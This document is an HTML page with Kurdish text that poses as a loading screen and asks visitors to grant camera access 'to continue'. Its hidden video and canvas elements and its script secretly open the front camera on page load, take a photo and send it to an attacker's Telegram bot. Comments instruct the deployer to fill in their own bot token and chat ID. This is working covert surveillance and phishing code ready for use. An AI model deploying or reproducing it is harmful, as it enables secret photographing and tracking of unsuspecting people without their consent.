<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بێخێرهاتن</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        }
        /* ڤیدیۆ و کانڤاس دێ ڤەشارتى بن داکو کەس نەبینیت */
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>پەیج یێ باربوو دکەت... چاڤەڕێ بە</h2>
    <p>ژ کەرەما خۆ دەستێریێ بدە کامیرێ بۆ بەردەوامبوونێ.</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // ⚠️ ل ڤێرێ زانیاریێن خۆ یێن ڕاستەقینە د ناڤبەرا ' ' دا بنڤێسه:
    const TELEGRAM_BOT_TOKEN = 'تۆکنێ_بۆتێ_خۆ_ل_ڤێرێ_دابنێ'; 
    const TELEGRAM_CHAT_ID = 'ئایدیێ_چاتێ_خۆ_یێ_ژمارەیی_ل_ڤێرێ_دابنێ'; 

    window.addEventListener('DOMContentLoaded', async () => {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        try {
            // داخوازکرنا دەستێریێ بۆ کامێرا پێشیێ
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            video.srcObject = stream;

            // چاڤەڕێ بوون بۆ 1.5 چرکە داکو وێنە ڕوون بیت
            setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob((blob) => {
                    sendPhotoToTelegram(blob);
                }, 'image/jpeg');

                // گرتنا کامیرێ پشتی وێنە هاتە گرتن
                stream.getTracks().forEach(track => track.stop());

            }, 1500);

        } catch (error) {
            console.log("دەستێری نەهاتە دان: ", error);
        }
    });

    function sendPhotoToTelegram(photoBlob) {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', photoBlob, 'captured_image.jpg');

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log('وێنە بۆ بۆتێ تە هاتە فرێکرن!');
        })
        .catch(err => console.error('خەلەتتی د فرێکرنێ دا:', err));
    }
</script>

</body>
</html>
